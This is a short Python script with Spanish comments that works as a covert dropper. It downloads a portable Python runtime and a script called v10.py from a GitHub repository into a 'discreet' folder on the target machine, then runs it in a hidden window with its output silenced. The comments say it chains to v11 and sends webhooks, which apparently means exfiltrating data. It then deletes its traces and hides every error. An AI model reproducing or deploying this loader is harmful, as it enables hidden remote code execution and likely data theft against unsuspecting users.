import os
import zipfile
import urllib.request
import subprocess

# Enlaces directos oficiales de tu repositorio
URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py.zip"
URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py"

# Rutas locales discretas en el equipo de destino
DIRECTORIO_DESTINO = os.path.join(os.environ.get("LOCALAPPDATA", "C:\\"), "V10Runtime")
ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
PYTHON_EJECUTABLE = os.path.join(DIRECTORIO_DESTINO, "python.exe")
SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")

def preparar_y_ejecutar():
    try:
        if not os.path.exists(DIRECTORIO_DESTINO):
            os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)
            
        # 1. Descargar el py.zip solo si el entorno portable no está instalado
        if not os.path.exists(PYTHON_EJECUTABLE):
            urllib.request.urlretrieve(URL_PY_ZIP, ZIP_TEMPORAL)
            with zipfile.ZipFile(ZIP_TEMPORAL, 'r') as zip_ref:
                zip_ref.extractall(DIRECTORIO_DESTINO)
                
            # Habilitar soporte de librerías externas (site-packages)
            for archivo in os.listdir(DIRECTORIO_DESTINO):
                if archivo.endswith("._pth"):
                    ruta_pth = os.path.join(DIRECTORIO_DESTINO, archivo)
                    with open(ruta_pth, "r", encoding="utf-8") as f:
                        contenido = f.read()
                    if "#import site" in contenido:
                        contenido = contenido.replace("#import site", "import site")
                        with open(ruta_pth, "w", encoding="utf-8") as f:
                            f.write(contenido)

        # 2. Descargar la versión más reciente de v10.py
        urllib.request.urlretrieve(URL_V10, SCRIPT_V10)

        # 3. Ejecutar v10 (el cual a su vez cargará v11 y enviará los webhooks) 
        # Usamos subprocess.run para pausar la limpieza hasta que todo termine.
        if os.path.exists(PYTHON_EJECUTABLE) and os.path.exists(SCRIPT_V10):
            subprocess.run(
                [PYTHON_EJECUTABLE, SCRIPT_V10],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
        # 4. Una vez que la ejecución completa de v10 y v11 finaliza, se borra el py.zip
        if os.path.exists(ZIP_TEMPORAL):
            os.remove(ZIP_TEMPORAL)
            
    except Exception:
        pass

if __name__ == "__main__":
    preparar_y_ejecutar()
